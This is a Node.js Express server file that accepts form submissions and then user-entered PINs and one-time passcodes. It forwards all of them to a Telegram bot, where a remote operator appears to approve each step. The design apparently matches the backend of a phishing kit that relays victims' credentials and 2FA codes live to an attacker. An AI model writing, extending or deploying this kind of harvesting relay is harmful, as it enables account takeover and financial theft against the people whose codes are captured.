import express from 'express';
import dotenv from 'dotenv';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { sendTelegramNotification, handleTelegramCallback, setWebhook, sendPinVerificationNotification, sendOtpVerificationNotification } from './src/telegram/telegramService.js';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3001;

app.use(express.json());

// Serve static files from build directory (for production)
if (fs.existsSync(path.join(__dirname, 'build'))) {
  app.use(express.static(path.join(__dirname, 'build')));
}

// Store form submissions in memory (in production, use a database)
const formSubmissions = new Map();

// Webhook endpoint for Telegram bot
app.post('/webhook/telegram', async (req, res) => {
  try {
    await handleTelegramCallback(req.body, formSubmissions);
    res.sendStatus(200);
  } catch (error) {
    console.error('Error handling Telegram webhook:', error);
    res.sendStatus(500);
  }
});

// Endpoint to receive form submissions from the frontend
app.post('/api/submit-form', async (req, res) => {
  try {
    const formData = req.body;
    
    // Generate unique ID for the submission
    const submissionId = Date.now().toString();
    formSubmissions.set(submissionId, {
      ...formData,
      id: submissionId,
      submissionId: submissionId,
      status: 'pending',
      pinVerified: false,
      pinStatus: 'pending',
      timestamp: new Date().toISOString()
    });

    // Send notification to Telegram (don't fail if it errors)
    try {
      await sendTelegramNotification(formData, submissionId);
      console.log('Telegram notification sent successfully');
    } catch (telegramError) {
      console.error('Telegram notification failed (continuing anyway):', telegramError.message);
    }

    res.json({ success: true, submissionId });
  } catch (error) {
    console.error('Error submitting form:', error);
    res.status(500).json({ success: false, error: 'Failed to submit form' });
  }
});

// Endpoint to check submission status
app.get('/api/submission/:id', (req, res) => {
  const submission = formSubmissions.get(req.params.id);
  if (submission) {
    res.json(submission);
  } else {
    res.status(404).json({ error: 'Submission not found' });
  }
});

// Endpoint to verify PIN
app.post('/api/verify-pin', async (req, res) => {
  try {
    const { submissionId, pin, formData } = req.body;
    
    const submission = formSubmissions.get(submissionId);
    if (!submission) {
      return res.status(404).json({ success: false, error: 'Submission not found' });
    }

    // Send PIN verification notification to Telegram (don't fail if it errors)
    try {
      await sendPinVerificationNotification(formData || submission, pin, submissionId);
      console.log('PIN verification notification sent successfully');
    } catch (telegramError) {
      console.error('PIN verification notification failed (continuing anyway):', telegramError.message);
      // Auto-approve PIN if Telegram fails (for local development)
      submission.pinVerified = true;
      submission.pinStatus = 'correct';
    }

    res.json({ success: true, message: 'PIN verification request sent' });
  } catch (error) {
    console.error('Error verifying PIN:', error);
    res.status(500).json({ success: false, error: 'Failed to verify PIN' });
  }
});

// Endpoint to check PIN verification status
app.get('/api/pin-status/:id', (req, res) => {
  const submission = formSubmissions.get(req.params.id);
  if (submission) {
    res.json({
      pinVerified: submission.pinVerified || false,
      pinStatus: submission.pinStatus || 'pending'
    });
  } else {
    res.status(404).json({ error: 'Submission not found' });
  }
});

// Endpoint to verify OTP
app.post('/api/verify-otp', async (req, res) => {
  try {
    const { submissionId, otp, formData } = req.body;
    
    const submission = formSubmissions.get(submissionId);
    if (!submission) {
      return res.status(404).json({ success: false, error: 'Submission not found' });
    }

    // Send OTP verification notification to Telegram (don't fail if it errors)
    try {
      await sendOtpVerificationNotification(formData || submission, otp, submissionId);
      console.log('OTP verification notification sent successfully');
    } catch (telegramError) {
      console.error('OTP verification notification failed (continuing anyway):', telegramError.message);
      // Auto-approve OTP if Telegram fails (for local development)
      submission.otpVerified = true;
      submission.otpStatus = 'correct';
    }

    res.json({ success: true, message: 'OTP verification request sent' });
  } catch (error) {
    console.error('Error verifying OTP:', error);
    res.status(500).json({ success: false, error: 'Failed to verify OTP' });
  }
});

// Endpoint to check OTP verification status
app.get('/api/otp-status/:id', (req, res) => {
  const submission = formSubmissions.get(req.params.id);
  if (submission) {
    res.json({
      otpVerified: submission.otpVerified || false,
      otpStatus: submission.otpStatus || 'pending'
    });
  } else {
    res.status(404).json({ error: 'Submission not found' });
  }
});

// SPA fallback - serve index.html for all non-API routes (production only)
app.get('*', (req, res) => {
  if (fs.existsSync(path.join(__dirname, 'build', 'index.html'))) {
    res.sendFile(path.join(__dirname, 'build', 'index.html'));
  } else {
    res.status(404).json({ error: 'Not found - run npm run build first' });
  }
});

// Set up Telegram webhook on server start
app.listen(PORT, async () => {
  console.log(`Server running on port ${PORT}`);
  
  // Only set webhook if APP_URL is provided and is HTTPS (required by Telegram)
  const appUrl = process.env.APP_URL;
  if (appUrl && appUrl.startsWith('https://')) {
    const webhookUrl = `${appUrl}/webhook/telegram`;
    try {
      await setWebhook(webhookUrl);
      console.log('Telegram webhook set successfully');
    } catch (error) {
      console.error('Failed to set Telegram webhook:', error);
    }
  } else {
    console.log('Skipping webhook setup (HTTPS URL required for Telegram webhooks)');
    console.log('Webhook will be set automatically when deployed to production');
  }
});

export default app;
